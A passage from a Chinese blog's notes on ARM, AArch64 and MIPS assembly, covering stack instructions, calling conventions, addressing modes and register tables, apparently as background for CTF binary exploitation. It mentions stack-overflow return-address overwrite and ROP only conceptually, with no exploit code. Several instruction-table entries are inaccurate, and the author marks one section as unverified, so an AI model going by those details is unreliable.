<p>执行<code>MEMORY[ADDRESS] = LR</code>后<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.lhyerror404.cn/error404/2020-02-03-032741.png" alt="image-20200203112741279"></p>
<p>接下来，<code>ADDRESS</code>逐次上移，以此填入寄存器的值。<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.lhyerror404.cn/error404/2020-02-03-032925.png" alt="image-20200203112924692"></p>
<p>至此，入栈指令执行结束。若入栈指令为<code>STMFD SP ,&#123;R0-R7，LR&#125;</code>，SP指针会在最后回到原位，不会改变SP指针的值。</p>
<h3 id="LDMFD"><a href="#LDMFD" class="headerlink" title="LDMFD"></a>LDMFD</h3><p>LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。<code>LDMFD SP! ,&#123;R0-R7，LR&#125;</code>实际上会执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP + <span class="number">9</span> x <span class="number">4</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">7</span></span><br><span class="line">    Ri = MEMORY[ADDRESS]</span><br><span class="line">    ADDRESS = ADDRESS - <span class="number">4</span></span><br><span class="line">LR = MEMORY[ADDRESS]</span><br></pre></td></tr></table></figure>

<h2 id="传参规则"><a href="#传参规则" class="headerlink" title="传参规则"></a>传参规则</h2><ol>
<li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li>
<li>在传递参数时，将所有参数看作是存放在连续的内存<strong>字单元</strong>的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。<strong>如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。</strong></li>
</ol>
<h2 id="返回值规则"><a href="#返回值规则" class="headerlink" title="返回值规则"></a>返回值规则</h2><ol>
<li>结果为一个32位整数时，可以通过寄存器R0返回</li>
<li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li>
<li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li>
<li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li>
<li>对于位数更多的结果，需要通过内存来传递。</li>
</ol>
<h2 id="访址规则"><a href="#访址规则" class="headerlink" title="访址规则"></a>访址规则</h2><h3 id="寄存器直接取址"><a href="#寄存器直接取址" class="headerlink" title="寄存器直接取址"></a>寄存器直接取址</h3><p>通常， LDR 指令被用来从内存中加载数据到寄存器， STR 指令被用作将寄存器的值存放到内存中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ LDR操作：从R0指向的地址中取值放到R2中</span><br><span class="line">LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ STR操作：将R2中的值放到R1指向的地址中</span><br><span class="line">STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.data          &#x2F;* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*&#x2F;</span><br><span class="line">var1: .word 3  &#x2F;* 内存中的第一个变量且赋值为3 *&#x2F;</span><br><span class="line">var2: .word 4  &#x2F;* 内存中的第二个变量且赋值为4 *&#x2F;</span><br><span class="line"></span><br><span class="line">.text          &#x2F;* 代码段开始 *&#x2F; </span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 </span><br><span class="line">    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 </span><br><span class="line">    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  </span><br><span class="line">    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3</span><br><span class="line">    bkpt        </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  &#x2F;* var1的地址助记符 *&#x2F;</span><br><span class="line">adr_var2: .word var2  &#x2F;* var2的地址助记符 *&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="立即数偏移寻址"><a href="#立即数偏移寻址" class="headerlink" title="立即数偏移寻址"></a>立即数偏移寻址</h3><p>接下来我们对这段代码进行反编译，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldr  r0, [ pc, #12 ]   ; 0x8088 &lt;adr_var1&gt;</span><br><span class="line">ldr  r1, [ pc, #12 ]   ; 0x808c &lt;adr_var2&gt;</span><br><span class="line">ldr  r2, [r0]</span><br><span class="line">str  r2, [r1]</span><br><span class="line">bx   lr</span><br></pre></td></tr></table></figure>

<p>此处，<code>[PC,#12]</code>的意义是<code>PC + 4*3</code>，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ldr  r0, [ pc, #12 ]   ; &lt;- PC</span><br><span class="line">    ldr  r1, [ pc, #12 ]   </span><br><span class="line">    ldr  r2, [r0]</span><br><span class="line">    str  r2, [r1]</span><br><span class="line">    bx   lr       </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  </span><br><span class="line">adr_var2: .word var2</span><br></pre></td></tr></table></figure>

<p>我们若想获取var_1，应该为<code>PC + 4 * 5</code>才对，但是我们之前提过的，<strong>在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置</strong>，也就是说，此时程序中的状况应该如下表所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ldr  r0, [ pc, #12 ]</span><br><span class="line">    ldr  r1, [ pc, #12 ]   </span><br><span class="line">    ldr  r2, [r0]          ; &lt;- PC</span><br><span class="line">    str  r2, [r1]</span><br><span class="line">    bx   lr       </span><br><span class="line"></span><br><span class="line">adr_var1: .word var1  </span><br><span class="line">adr_var2: .word var2</span><br></pre></td></tr></table></figure>

<p>这种形如<code>[Ri , num]</code>的方式被称为<strong>立即数作偏移寻址</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。</span><br><span class="line">str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br><span class="line">ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1&#x3D;R1+4。</span><br></pre></td></tr></table></figure>

<h3 id="寄存器作偏移寻址"><a href="#寄存器作偏移寻址" class="headerlink" title="寄存器作偏移寻址"></a>寄存器作偏移寻址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 </span><br><span class="line">str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1&#x3D;R1+R2。</span><br><span class="line">ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1&#x3D;R1+R2。</span><br></pre></td></tr></table></figure>

<h3 id="寄存器缩放值作偏移寻址"><a href="#寄存器缩放值作偏移寻址" class="headerlink" title="寄存器缩放值作偏移寻址"></a>寄存器缩放值作偏移寻址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 &#x3D; R1 + R2&lt;&lt;2。</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 &#x3D; R1 + R2&lt;&lt;2。</span><br></pre></td></tr></table></figure>

<h2 id="ARMEABI"><a href="#ARMEABI" class="headerlink" title="ARMEABI"></a>ARMEABI</h2><blockquote>
<p>未验证，感觉有点冲突</p>
</blockquote>
<p>前面介绍了arm 64位架构，armeabi 是 32 架构，指令也类似，只不过它的栈布局与常规 x86 的一样，<strong>R11和PC的值保存在栈底</strong>。<strong>R11充当ebp，PC充当RIP</strong> 。 LDMFD  SP!, {R11,PC} 指令即相当于 pop ebp;ret 的作用</p>
<p>例题：[inctf2018_wARMup](# inctf2018_wARMup)</p>
<h1 id="Arch64架构"><a href="#Arch64架构" class="headerlink" title="Arch64架构"></a>Arch64架构</h1><p>在ARMv8引入的一种全新架构。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫 Xn ，运行在32位的时候就叫 Wn 。</p>
<table>
<thead>
<tr>
<th align="center">寄存器</th>
<th align="center">别名</th>
<th align="center">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SP</td>
<td align="center">–</td>
<td align="center">Stack Pointer:栈指针</td>
</tr>
<tr>
<td align="center">R30</td>
<td align="center">LR</td>
<td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td>
</tr>
<tr>
<td align="center">R29</td>
<td align="center">FP</td>
<td align="center">Frame Pointer:保存函数栈的基地址。</td>
</tr>
<tr>
<td align="center">R19-R28</td>
<td align="center">–</td>
<td align="center">Callee-saved registers（含义见上面术语解释）</td>
</tr>
<tr>
<td align="center">R18</td>
<td align="center">–</td>
<td align="center">平台寄存器，有特定平台解释其用法。</td>
</tr>
<tr>
<td align="center">R17</td>
<td align="center">IP1</td>
<td align="center">The second intra-procedure-call temporary register……</td>
</tr>
<tr>
<td align="center">R16</td>
<td align="center">IP0</td>
<td align="center">The first intra-procedure-call temporary register……</td>
</tr>
<tr>
<td align="center">R9-R15</td>
<td align="center">–</td>
<td align="center">临时寄存器</td>
</tr>
<tr>
<td align="center">R8</td>
<td align="center">–</td>
<td align="center">在一些情况下，返回值是通过R8返回的</td>
</tr>
<tr>
<td align="center">R0-R7</td>
<td align="center">–</td>
<td align="center">在函数调用过程中传递参数和返回值</td>
</tr>
<tr>
<td align="center">NZCV</td>
<td align="center">–</td>
<td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td>
</tr>
</tbody></table>
<h2 id="指令基本格式"><a href="#指令基本格式" class="headerlink" title="指令基本格式"></a>指令基本格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Opcode&gt;&#123;&lt;Cond&gt;&#125;&lt;S&gt; &lt;Rd&gt;, &lt;Rn&gt; &#123;,&lt;Opcode2&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。</p>
<p>Cond：指令执行条件码。</p>
<p>S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。</p>
<p>Rd/Xt：目标寄存器，A32指令可以选择R0-R14，T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。</p>
<p>Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。</p>
<p>Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。</p>
<h2 id="内存操作指令-load-store"><a href="#内存操作指令-load-store" class="headerlink" title="内存操作指令-load/store"></a>内存操作指令-load/store</h2><p>在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。</p>
<p>在ARM-v8指令集中，程序支持以下五种寻址方式：</p>
<ol>
<li>Base register only (no offset) ：基址寄存器无偏移。形如:<code>[ base &#123; , #0 &#125; ]</code>。</li>
<li>Base plus offset：基址寄存器加偏移。形如:<code>[ base &#123; , #imm &#125; ]</code>。</li>
<li>Pre-indexed：事先更新寻址，先变化后操作。形如:<code>[ base , #imm ]!</code>。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</li>
<li>Post-indexed：事后更新寻址，先操作后变化。形如:<code>[ base ] , #imm</code>。</li>
<li>Literal (PC-relative): PC相对寻址。</li>
</ol>
<p>常见的Load/Store指令有：</p>
<p>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</p>
<p>⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。</p>
<p>举例：</p>
<p><code>LDR X1 , [X2]</code>——将X2寄存器中的值赋给X1寄存器。</p>
<p><code>LDR X1 , [X2] ， #4</code>——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。</p>
<p>对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。</p>
<h2 id="与-amd-的变化"><a href="#与-amd-的变化" class="headerlink" title="与 amd 的变化"></a>与 amd 的变化</h2><blockquote>
<p>引用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105281585">:link:</a></p>
</blockquote>
<p>栈布局上和 amd 有比较大区别，这样一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fun();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从 main 进入 fun 时，栈分布如下：</p>
<table>
<thead>
<tr>
<th align="center">内存地址</th>
<th align="left">内存中的数据</th>
<th align="left">备注</th>
<th align="center">所有者</th>
</tr>
</thead>
<tbody><tr>
<td align="center">低</td>
<td align="left">X29 value</td>
<td align="left">main 调用 fun 时的寄存器值</td>
<td align="center">fun</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">X30 value</td>
<td align="left">同上</td>
<td align="center">fun</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">buf</td>
<td align="left">fun 的局部变量</td>
<td align="center">fun</td>
</tr>
<tr>
<td align="center"></td>
<td align="left">X29 value</td>
<td align="left">上层函数调用main时的寄存器值</td>
<td align="center">main</td>
</tr>
<tr>
<td align="center">高</td>
<td align="left">X30 value</td>
<td align="left">同上</td>
<td align="center">main</td>
</tr>
</tbody></table>
<p><strong>x86 架构下的 rbp、rip 保存在栈低，aarch64 架构下保存在栈顶。</strong></p>
<p><strong>如果存在栈溢出，修改的上层函数的 rbp 和 rip（x29、x30）。</strong></p>
<h1 id="MIPS架构"><a href="#MIPS架构" class="headerlink" title="MIPS架构"></a>MIPS架构</h1><h2 id="mips、mipsel的区别"><a href="#mips、mipsel的区别" class="headerlink" title="mips、mipsel的区别"></a>mips、mipsel的区别</h2><p>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。</p>
<h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><p>各个寄存器表示的含义如下</p>
<table>
<thead>
<tr>
<th align="center">编号</th>
<th align="center">名称</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$0</td>
<td align="center">$zero</td>
<td align="left">第0号寄存器，其值始终为0。</td>
</tr>
<tr>
<td align="center">$1</td>
<td align="center">$at</td>
<td align="left">保留寄存器</td>
</tr>
<tr>
<td align="center">$2-$3</td>
<td align="center">$v0-$v1</td>
<td align="left">values，保存表达式或函数返回结果</td>
</tr>
<tr>
<td align="center">$4-$7</td>
<td align="center">$a0-$a3</td>
<td align="left">argument，作为函数的前四个参数</td>
</tr>
<tr>
<td align="center">$8-$15</td>
<td align="center">$t0-$t7</td>
<td align="left">temporaries，供汇编程序使用的临时寄存器</td>
</tr>
<tr>
<td align="center">$16-$23</td>
<td align="center">$s0-$s7</td>
<td align="left">saved values，子函数使用时需先保存原寄存器的值</td>
</tr>
<tr>
<td align="center">$24-$25</td>
<td align="center">$t8-$t9</td>
<td align="left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。</td>
</tr>
<tr>
<td align="center">$26-$27</td>
<td align="center">$k0-$k1</td>
<td align="left">保留，中断处理函数使用</td>
</tr>
<tr>
<td align="center">$28</td>
<td align="center">$gp</td>
<td align="left">global pointer，全局指针</td>
</tr>
<tr>
<td align="center">$29</td>
<td align="center">$sp</td>
<td align="left">stack pointer，堆栈指针，指向堆栈的栈顶</td>
</tr>
<tr>
<td align="center">$30</td>
<td align="center">$fp</td>
<td align="left">frame pointer，保存栈指针</td>
</tr>
<tr>
<td align="center">$31</td>
<td align="center">$ra</td>
<td align="left">return address，返回地址</td>
</tr>
</tbody></table>
<p>三个特殊的寄存器： <code>PC</code> 即程序计数器； <code>HI</code> 即乘除结果高位寄存器； <code>LO</code> 即乘除结果低位寄存器。</p>
<h2 id="堆栈规则"><a href="#堆栈规则" class="headerlink" title="堆栈规则"></a>堆栈规则</h2><p>栈操作：向低地址增长，<strong>没有 EBP <strong>，进入一个函数，需要将当前栈指针向下移动 n bit ，当函数返回时才将栈指针加上偏移量恢复栈。</strong>由于不能随便移动栈指针，所以寄存器压栈和出栈都必需指定偏移量</strong>。</p>
<p>用 <code>$a0~$a3</code>传递函数的前 4 个参数，多余的参数用栈传递。函数返回值一般用 <code>$v0~$v1</code> 寄存器传递。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207230503.png" alt="image-20210207230503396"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207230327.png" alt="image-20210207230327624"></p>
<p>在 x86 架构中，使用 call 命令调用函数时，会先将当前执行位置压入堆栈，mips 的调用指令把函数的<strong>返回地址直接存入 $RA 寄存器</strong>而不是在堆栈中。</p>
<h2 id="函数调用的过程"><a href="#函数调用的过程" class="headerlink" title="函数调用的过程"></a>函数调用的过程</h2><blockquote>
<p>叶子函数：不再调用其他函数。非叶子函数相反。</p>
</blockquote>
<ol>
<li>A 函数调用 B 函数时，复制当前<code>$PC</code>的值到<code>$RA</code>寄存器，然后跳到子函数执行</li>
<li>到 B 函数时，如果为<strong>非叶子函数，则返回地址会先存入堆栈</strong>；</li>
<li>返回时，如果 B 函数为<strong>叶子函数，则<code>jr $ra</code>直接返回</strong>；非叶子函数先从堆栈取出返回地址，然后将返回地址放入 $RA ，再 <code>jr $ra</code> 。</li>
</ol>
<h2 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208104045.png" alt="image-20210208104045076"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208104123.png" alt="image-20210208104123907"></p>
<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><table>
<thead>
<tr>
<th align="center"><strong>指令</strong></th>
<th align="left"><strong>功能</strong></th>
<th align="left"><strong>应用实例</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>J</strong></td>
<td align="left"><strong>直接跳转指令，跳转的地址在指令中</strong></td>
<td align="left"><strong>J name</strong></td>
</tr>
<tr>
<td align="center"><strong>JR</strong></td>
<td align="left"><strong>跳转到寄存器里的地址值指向的地方</strong></td>
<td align="left"><strong>JR R1</strong></td>
</tr>
<tr>
<td align="center"><strong>JAL</strong></td>
<td align="left"><strong>直接跳转指令，跳转的地址在指令中，跳转时，会将返回地址存入$ra寄存器</strong></td>
<td align="left"><strong>JAL R1 name</strong></td>
</tr>
<tr>
<td align="center"><strong>JALR</strong></td>
<td align="left"><strong>跳转到寄存器里的地址值指向的地方，跳转时，会将返回地址存入$ra寄存器</strong></td>
<td align="left"><strong>JALR R1</strong></td>
</tr>
<tr>
<td align="center">LB</td>
<td align="left">从存储器中读取一个字节的数据到寄存器中</td>
<td align="left">LB R1, 0(R2)</td>
</tr>
<tr>
<td align="center">LH</td>
<td align="left">从存储器中读取半个字的数据到寄存器中</td>
<td align="left">LH R1, 0(R2)</td>
</tr>
<tr>
<td align="center"><strong>LW</strong></td>
<td align="left"><strong>从存储器中读取一个字的数据到寄存器中</strong></td>
<td align="left"><strong>LW R1, 0(R2)</strong></td>
</tr>
<tr>
<td align="center">LD</td>
<td align="left">从存储器中读取双字的数据到寄存器中</td>
<td align="left">LD R1, 0(R2)</td>
</tr>
<tr>
<td align="center">L.S</td>
<td align="left">从存储器中读取单精度浮点数到寄存器中</td>
<td align="left">L.S R1, 0(R2)</td>
</tr>
<tr>
<td align="center">L.D</td>
<td align="left">从存储器中读取双精度浮点数到寄存器中</td>
<td align="left">L.D R1, 0(R2)</td>
</tr>
<tr>
<td align="center">LBU</td>
<td align="left">功能与LB指令相同，但读出的是不带符号的数据</td>
<td align="left">LBU R1, 0(R2)</td>
</tr>
<tr>
<td align="center">LHU</td>
<td align="left">功能与LH指令相同，但读出的是不带符号的数据</td>
<td align="left">LHU R1, 0(R2)</td>
</tr>
<tr>
<td align="center">LWU</td>
<td align="left">功能与LW指令相同，但读出的是不带符号的数据</td>
<td align="left">LWU R1, 0(R2)</td>
</tr>
<tr>
<td align="center"><strong>la</strong></td>
<td align="left"><strong>相当于x86的lea</strong></td>
<td align="left"></td>
</tr>
<tr>
<td align="center"><strong>lai</strong></td>
<td align="left"><strong>i的意思是immediate立即数，即后面的对象为立即数</strong></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">SB</td>
<td align="left">把一个字节的数据从寄存器存储到存储器中</td>
<td align="left">SB R1, 0(R2)</td>
</tr>
<tr>
<td align="center">SH</td>
<td align="left">把半个字节的数据从寄存器存储到存储器中</td>
<td align="left">SH R1，0(R2)</td>
</tr>
<tr>
<td align="center"><strong>SW</strong></td>
<td align="left"><strong>把一个字的数据从寄存器存储到存储器中</strong></td>
<td align="left"><strong>SW R1, 0(R2)</strong></td>
</tr>
<tr>
<td align="center">SD</td>
<td align="left">把两个字节的数据从寄存器存储到存储器中</td>
<td align="left">SD R1, 0(R2)</td>
</tr>
<tr>
<td align="center">S.S</td>
<td align="left">把单精度浮点数从寄存器存储到存储器中</td>
<td align="left">S.S R1, 0(R2)</td>
</tr>
<tr>
<td align="center">S.D</td>
<td align="left">把双精度数据从存储器存储到存储器中</td>
<td align="left">S.D R1, 0(R2)</td>
</tr>
<tr>
<td align="center">DADD</td>
<td align="left">把两个定点寄存器的内容相加，也就是定点加</td>
<td align="left">DADD R1,R2,R3</td>
</tr>
<tr>
<td align="center">DADDI</td>
<td align="left">把一个寄存器的内容加上一个立即数</td>
<td align="left">DADDI R1,R2,#3</td>
</tr>
<tr>
<td align="center">DADDU</td>
<td align="left">不带符号的加</td>
<td align="left">DADDU R1,R2,R3</td>
</tr>
<tr>
<td align="center">DADDIU</td>
<td align="left">把一个寄存器的内容加上一个无符号的立即数</td>
<td align="left">DADDIU R1,R2,#3</td>
</tr>
<tr>
<td align="center">ADD.S</td>
<td align="left">把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td>
<td align="left">ADD.S F0,F1,F2</td>
</tr>
<tr>
<td align="center">ADD.D</td>
<td align="left">把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td>
<td align="left">ADD.D F0,F1,F2</td>
</tr>
<tr>
<td align="center">ADD.PS</td>
<td align="left">两个单精度浮点数相加，结果是单精度浮点数</td>
<td align="left">ADD.PS F0,F1,F2</td>
</tr>
<tr>
<td align="center">DSUB</td>
<td align="left">两个寄存器的内容相减，也就是定点数的减</td>
<td align="left">DSUB R1,R2,R3</td>
</tr>
<tr>
<td align="center">DSUBU</td>
<td align="left">不带符号的减</td>
<td align="left">DSUBU R1,R2,R3</td>
</tr>
<tr>
<td align="center">SUB.S</td>
<td align="left">一个双精度浮点数减去一个单精度浮点数，结果为单精度</td>
<td align="left">SUB.S F1,F2,F3</td>
</tr>
<tr>
<td align="center">SUB.D</td>
<td align="left">一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td>
<td align="left">SUB.D F1,F2,F3</td>
</tr>
<tr>
<td align="center">SUB.PS</td>
<td align="left">两个单精度浮点数相减</td>
<td align="left">SUB.SP F1,F2,F3</td>
</tr>
<tr>
<td align="center">DDIV</td>
<td align="left">两个定点寄存器的内容相除，也就是定点除</td>
<td align="left">DDIV Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">DDIVU</td>
<td align="left">不带符号的除法运算</td>
<td align="left">DDIVU Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">DIV.S</td>
<td align="left">一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td>
<td align="left">DIV.S F1,F2,F3</td>
</tr>
<tr>
<td align="center">DIV.D</td>
<td align="left">一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td>
<td align="left">DIV.D F1,F2,F3</td>
</tr>
<tr>
<td align="center">DIV.PS</td>
<td align="left">两个单精度浮点数相除，结果为单精度</td>
<td align="left">DIV.PS F1,F2,F3</td>
</tr>
<tr>
<td align="center">DMUL</td>
<td align="left">两个定点寄存器的内容相乘，也就是定点乘</td>
<td align="left">DMUL Ｒ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">DMULU</td>
<td align="left">不带符号的乘法运算</td>
<td align="left">DMULU R1,R2,R3</td>
</tr>
<tr>
<td align="center">MUL.S</td>
<td align="left">一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td>
<td align="left">DMUL.S F1,F2,F3</td>
</tr>
<tr>
<td align="center">MUL.D</td>
<td align="left">一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td>
<td align="left">DMUL.D F1,F2,F3</td>
</tr>
<tr>
<td align="center">MUL.PS</td>
<td align="left">两个单精度浮点数相乘，结果为单精度浮点数</td>
<td align="left">DMUL.PS F1,F2,F3</td>
</tr>
<tr>
<td align="center">AND</td>
<td align="left">与运算，两个寄存器中的内容相与</td>
<td align="left">ANDＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">ANDI</td>
<td align="left">一个寄存器中的内容与一个立即数相与</td>
<td align="left">ANDIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td align="center">OR</td>
<td align="left">或运算，两个寄存器中的内容相或</td>
<td align="left">ORＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">ORI</td>
